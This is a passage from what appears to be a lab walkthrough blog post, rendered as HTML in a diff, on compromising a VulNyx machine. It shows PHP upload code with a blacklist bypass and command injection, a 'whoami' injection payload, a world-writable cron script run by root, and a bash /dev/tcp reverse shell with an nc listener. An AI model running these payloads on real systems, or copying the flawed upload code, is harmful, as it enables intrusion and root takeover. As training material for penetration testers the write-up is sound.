+    &lt;span class=&quot;c1&quot;&gt;// Store the name and the phone number of the user in a txt file&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$user_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Name: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Phone number: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$phone_number&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$save_user_data_command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;echo &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_data&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; &amp;gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/userinfo.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$save_user_data_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Set the not allowed file extensions&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$not_allowed_file_extensions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// These will be the only file extensions allowed&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Get the file extension&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$file_extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;submit&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$not_allowed_file_extensions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If the file extension is not allowed&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;This file looks malicious. Please do not try to hack us.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If the file extension is allowed&lt;/span&gt;
+
+            &lt;span class=&quot;c1&quot;&gt;// Try to upload the file&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$file_upload_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$successful_upload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_tmp_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_upload_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$successful_upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If the upload was successful&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;The file &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; has been uploaded&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If the upload was unsuccessful&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;An error occurred. Please contact the administrator.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The code is is very understandable with the comments so it doesn’t require much explanation, but the vulnerability is in the following line&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Set the not allowed file extensions&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$not_allowed_file_extensions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// These will be the only file extensions allowed&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;because &lt;strong&gt;it is using a blacklist of not allowed extensions&lt;/strong&gt;. It is only blocking the upload of files with &lt;em&gt;php&lt;/em&gt; and &lt;em&gt;sh&lt;/em&gt; extensions but allowing other extensions that are also interpretable by a PHP backend, such as &lt;em&gt;phtml&lt;/em&gt;. That is why &lt;strong&gt;it is recommended to use a whitelist of allowed extensions and if possible other additional measures such as content checking&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Additionally, if we scour the code we can identify another critical vulnerability… can you find it?&lt;/p&gt;
+
+&lt;p&gt;Here it goes. In the following code, which is the one used to save the user’s data in a txt, there is a command injection&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Store the name and the phone number of the user in a txt file&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$user_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Name: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Phone number: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$phone_number&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$save_user_data_command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;echo &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_data&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; &amp;gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/userinfo.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$save_user_data_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this code the &lt;em&gt;system&lt;/em&gt; function is executed taking as input the user’s data without sanitizing. Therefore, sending the following payload&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HackCommander&apos;;whoami
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;the following response is obtained&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/command-injection.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The presence of this vulnerability does not affect the difficulty of the machine as this method is more difficult to find and exploit than arbitrary file uploading. This is why the machine remains easy.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3&quot; /&gt;
+
+&lt;h2 id=&quot;3-privilege-escalation&quot;&gt;3. Privilege escalation&lt;/h2&gt;
+
+&lt;div id=&quot;section-id-3-1&quot; /&gt;
+
+&lt;h2 id=&quot;31-detecting-the-cronjob-vulnerability&quot;&gt;3.1. Detecting the cronjob vulnerability&lt;/h2&gt;
+
+&lt;p&gt;Taking a look at the candidate user’s home we can see that there is a hidden directory &lt;em&gt;.scripts&lt;/em&gt; with a script named &lt;em&gt;makeBackup.sh&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;/var/www/html
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/candidate
+&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;/home/candidate
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 36
+drwx------ 5 candidate candidate 4096 Mar 28 10:56 .
+drwxr-xr-x 3 root      root      4096 Mar 28 10:11 ..
+drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:53 .backups
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;lrwxrwxrwx 1 root      root         9 Nov 15 10:43 .bash_history -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/dev/null
+&lt;span class=&quot;go&quot;&gt;-rw-r--r-- 1 candidate candidate  220 Nov 15 10:23 .bash_logout
+-rw-r--r-- 1 candidate candidate 3526 Nov 15 10:23 .bashrc
+drwxr-xr-x 3 candidate candidate 4096 Mar 28 10:56 .local
+-rw-r--r-- 1 candidate candidate  807 Nov 15 10:23 .profile
+drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:57 .scripts
+-r-------- 1 candidate candidate   33 Mar 28 10:31 user.txt
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .scripts
+&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 12
+drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:57 .
+drwx------ 5 candidate candidate 4096 Mar 28 10:56 ..
+-rwxrwxrwx 1 candidate candidate  399 Mar 28 10:57 makeBackup.sh
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;makeBackup.sh
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/bash
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Source folder to be backed up
+&lt;span class=&quot;go&quot;&gt;source_folder=&quot;/var/www/html/uploads/&quot;
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Destination folder &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the backup
+&lt;span class=&quot;go&quot;&gt;backup_folder=&quot;/home/candidate/.backups/&quot;
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Create backup folder &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;it doesn&lt;span class=&quot;s1&quot;&gt;&apos;t exist
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;mkdir -p &quot;$&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;backup_folder&quot;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Backup file name
+&lt;span class=&quot;gp&quot;&gt;backup_file=&quot;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;backup_folder&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;backup.tar.gz&lt;span class=&quot;s2&quot;&gt;&quot;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Create a compressed &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;archive of the &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;folder
+&lt;span class=&quot;gp&quot;&gt;tar -czf &quot;$&lt;/span&gt;backup_file&lt;span class=&quot;s2&quot;&gt;&quot; -C &quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$source_folder&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; .
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This script is used to backup the directory &lt;em&gt;/var/www/html/uploads/&lt;/em&gt; (the data uploaded by candidates) and save it to the file &lt;em&gt;/home/candidate/.backups/backup.tar.gz&lt;/em&gt;. Backing up is always a good idea and in this case the sysadmin tries to make sure that the data uploaded by the user is safe. One important thing is that the main characteristic of backups is that they are &lt;strong&gt;periodic&lt;/strong&gt; tasks, so it would not be unusual for the machine to have some recurring task configured to run this script. In linux these tasks are called &lt;a href=&quot;https://cronitor.io/guides/cron-jobs&quot;&gt;cronjobs&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;We can check which cronjobs the machine has configured as follows&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/etc/crontab: system-wide crontab
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Unlike any other crontab you don&lt;span class=&quot;s1&quot;&gt;&apos;t have to run the `crontab&apos;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;the new version when you edit this file
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;and files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /etc/cron.d. These files also have username fields,
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;that none of the other crontabs &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Example of job definition:
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;.---------------- minute &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 59&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  .------------- hour &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 23&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  .---------- day of month &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 - 31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  .------- month &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 - 12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OR jan,feb,mar,apr ...
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  |  .---- day of week &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sunday&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 or 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OR sun,mon,tue,wed,thu,fri,sat
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  |  |
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; user-name &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to be executed
+&lt;span class=&quot;go&quot;&gt;17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;25 6    * * *   root    test -x /usr/sbin/anacron || { cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Indeed, there is a line containing a reference to this script&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;* * * * * root /bin/sh /home/candidate/Scripts/makeBackup.sh
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;but it is necessary to understand it. The meaning of each one of the elements of the line is&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The first asterisk indicates the minute of each hour in which the task will be executed. In this case, using an asterisk means that it will be executed every minute.&lt;/li&gt;
+  &lt;li&gt;The second asterisk indicates the hour of the day when the task will be executed. When configured with an asterisk, the task will be executed at all hours.&lt;/li&gt;
+  &lt;li&gt;The third asterisk indicates the day of the month on which the task will run. Again, when using an asterisk, the task will be executed on all days of the month.&lt;/li&gt;
+  &lt;li&gt;The fourth asterisk indicates the month in which the task will be executed. When set with an asterisk, the task will be executed in all months.&lt;/li&gt;
+  &lt;li&gt;The fifth asterisk indicates the day of the week on which the task will be executed. When using an asterisk, the task will be executed on all days of the week (Monday through Sunday).&lt;/li&gt;
+  &lt;li&gt;The word &lt;em&gt;root&lt;/em&gt; specifies the user under which the task will be executed.&lt;/li&gt;
+  &lt;li&gt;The word &lt;em&gt;/bin/sh&lt;/em&gt; is the path to the shell interpreter that will be used to execute the script.&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;/home/candidate/.scripts/makeBackup.sh&lt;/em&gt; is the path of the script to be executed during the task.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In a nutshell, &lt;strong&gt;the script &lt;em&gt;/home/candidate/.scripts/makeBackup.sh&lt;/em&gt; is executed every minute by the &lt;em&gt;root&lt;/em&gt; user&lt;/strong&gt;. In this case there is no reason for the cronjob to be executed with the &lt;em&gt;root&lt;/em&gt; user because all the directories involved are accessible with the &lt;em&gt;candidate&lt;/em&gt; user. However, it is not uncommon to find this type of configuration due to carelessness and convenience of the sysadmins because the &lt;em&gt;root&lt;/em&gt; user will never throw a permissions denied.&lt;/p&gt;
+
+&lt;p&gt;If we combine this with the fact that, as we saw before, &lt;strong&gt;the &lt;em&gt;makeBackup.sh&lt;/em&gt; script has read, write and execute permissions for all users&lt;/strong&gt;, we are 100% sure that we already have a vector to escalate privileges to &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-2&quot; /&gt;
+
+&lt;h2 id=&quot;32-getting-a-shell-as-root&quot;&gt;3.2. Getting a shell as root&lt;/h2&gt;
+
+&lt;p&gt;The strategy now is to execute a shell of the type&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;/bin/bash
+&lt;span class=&quot;gp&quot;&gt;bash -c &apos;bash -i &amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.0.2.15/1235 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;&apos;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Setting up a listener on the attacking machine on port 1235&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;nc -nlvp 1235
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and then executing the following code on the target machine&lt;/p&gt;
+
